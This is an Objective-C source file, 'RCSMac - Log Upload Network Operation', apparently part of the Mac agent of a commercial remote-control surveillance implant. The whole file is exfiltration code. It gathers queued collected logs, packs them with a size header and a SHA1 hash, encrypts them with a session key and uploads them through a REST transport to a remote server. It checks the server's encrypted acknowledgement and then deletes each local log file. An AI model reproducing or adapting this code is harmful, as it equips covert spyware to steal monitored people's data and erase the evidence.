/*
 * RCSMac - Log Upload Network Operation
 *
 *
 * Created on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "LogNetworkOperation.h"

#import "LogNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "FSNetworkOperation.h"
#import "RCSILogManager.h"
#import "RCSITaskManager.h"

#import "NSString+SHA1.h"
#import "NSData+SHA1.h"

#import "RCSICommon.h"
//#define DEBUG_LOG_NOP

@interface LogNetworkOperation (private)

- (BOOL)_sendLogContent: (NSData *)aLogData;

@end

@implementation LogNetworkOperation (private)

- (BOOL)_sendLogContent: (NSData *)aLogData
{
  if (aLogData == nil)
    {   
      return NO;
    }
  
  uint32_t command              = PROTO_LOG;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  
  // message = PROTO_LOG | log_size | log_content | sha
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  uint32_t dataSize             = [aLogData length];
  [commandData appendBytes: &dataSize
                    length: sizeof(uint32_t)];
  [commandData appendData: aLogData];
  
  NSData *commandSha            = [commandData sha1Hash];
  
  [commandData appendData: commandSha];
  
  // XXX-
  [commandData encryptWithKey: gSessionKey];
  
  // Send encrypted message
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  if (replyData == nil/* or == null*/)
    {
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  // check integrity
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {     
      [replyDecrypted release];
      [commandData release];
      [outerPool release];      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
   
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
      [replyDecrypted release];
      [commandData release];
      [outerPool release];      
      return NO;
    }
   
  if (command != PROTO_OK)
    {
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  return YES;
}

@end


@implementation LogNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [super dealloc];
}

- (BOOL)perform
{ 
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  id anObject;
  
  RCSILogManager *logManager = [RCSILogManager sharedInstance];

  // Logs to the send queue
  if ([logManager closeActiveLogsAndContinueLogging: TRUE] == YES)
    {
#ifdef DEBUG_LOG_NOP
      NSLog(@"%s: Active logs closed correctly", __FUNCTION__);
#endif
    }

  int logCount = [logManager getSendLogItemCount];
  
  NSMutableIndexSet *sendedItem  = [NSMutableIndexSet indexSet];
  
  //
  // Send all the logs in the send queue
  //
  for (int i=0; i < logCount; i++)
    {
      anObject = [logManager getSendLogItemAtIndex:i];
      
      if (anObject == nil)
        continue;
        
      NSString *logName = [anObject objectForKey: @"logName"];

      if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
        {
          NSData *logContent  = [NSData dataWithContentsOfFile: logName];
          
          if ([self _sendLogContent: logContent] == YES)
            {
              [sendedItem addIndex:i];

              if ([[NSFileManager defaultManager] removeItemAtPath: logName
                                                         error: nil] == NO)
                {
#ifdef DEBUG_LOG_NOP
                  NSLog(@"%s: Error while removing (%@)", __FUNCTION__, logName);
#endif
                }
            }
        }
    }
  
  [logManager clearSendLogQueue: sendedItem];
  
  [outerPool release];
  
  return YES;
}
  
@end
